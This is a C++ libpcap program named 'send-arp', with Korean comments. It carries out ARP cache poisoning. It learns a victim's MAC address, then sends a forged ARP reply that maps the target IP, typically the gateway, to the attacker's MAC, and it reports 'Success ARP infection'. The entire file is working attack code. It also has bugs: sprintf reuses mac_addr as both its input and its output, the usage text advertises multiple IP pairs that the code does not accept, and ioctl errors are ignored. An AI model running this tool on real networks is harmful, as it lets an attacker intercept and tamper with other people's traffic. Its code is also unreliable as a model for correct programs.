#include <cstdio>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"

#define MAC_LEN 6

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

int get_my_mac(char *ifname, char *mac_addr)
{
        struct ifreq ifr;
        int sockfd, ret;


        sockfd = socket(AF_INET,SOCK_DGRAM,0);
        if(sockfd < 0)
                perror("socket error");

        strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
        ret = ioctl(sockfd,SIOCGIFHWADDR, &ifr);
        if(ret < 0){
                perror("ioctl error");
                close(sockfd);
        }


        memcpy(mac_addr, ifr.ifr_hwaddr.sa_data,MAC_LEN);

        close(sockfd);

        sprintf(mac_addr,"%02X:%02X:%02X:%02X:%02X:%02X",mac_addr[0],mac_addr[1],mac_addr[2],mac_addr[3],mac_addr[4],mac_addr[5]&0x000000FF);


        return 0;


}

int get_my_ip(char *ifname, char *ip)
{
	struct ifreq ifr;
	int sockfd;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0)
		perror("socket error");

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0){
		perror("ioctl error");
		close(sockfd);
	}

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,ip,sizeof(struct sockaddr));
	
	return 0;

}


int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char *dev = argv[1];
	char  my_mac[20];
	char  my_ip[20];
	int   check = 0;
	char *sender_ip = argv[2];
	char *target_ip = argv[3];	
	char errbuf[PCAP_ERRBUF_SIZE];
	check = get_my_mac(argv[1],my_mac);
	if(check <0){
		perror("fail gey_my_mac");
		return -1;
	}

	check  = get_my_ip(argv[1],my_ip);
	if(check <0){
		perror("fail get_my_ip");
		return -1;
	}
		
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}



	EthArpPacket packet;

	packet.eth_.dmac_ = Mac::broadcastMac();  //목적지 mac주소를 모르기떄문에 FF:FF:FF:FF:FF:FF인 브로드캐스트 사용
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);

	packet.arp_.smac_ = Mac(my_mac); 
	packet.arp_.sip_ = htonl(Ip(my_ip));
	packet.arp_.tmac_ = Mac::nullMac(); // target의 mac 주소를 모르고 있을떄 사용
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}


	
	
	EthArpPacket *sniff;

	while(true){
		struct pcap_pkthdr* header;	
		const u_char* packet;
		char *name = NULL;
		res = pcap_next_ex(handle, &header,&packet );
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		sniff = (EthArpPacket*)packet;

		if((sniff->eth_.type() == sniff->eth_.Arp) && (sniff->arp_.op() == sniff->arp_.Reply)){ // 이더넷 Type이 arp이고, arp의 opcode값이 reply값이면 요청한 응답을 받을 수 있음.
			if((sniff->arp_.sip() == Ip(sender_ip)) && (sniff->arp_.tmac() == Mac(my_mac)) && (sniff->arp_.tip() == Ip(my_ip))){ 
				printf("find sender mac\n");
				std::cout << "sender mac : " << std::string(sniff->arp_.smac()) << std::endl;;
				
				break;
			}
		}
	}
	
	packet.eth_.dmac_ = Mac(sniff->arp_.smac()); 
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);

	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sniff->arp_.smac());
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

	printf("Success ARP infection\n");



	pcap_close(handle);
}

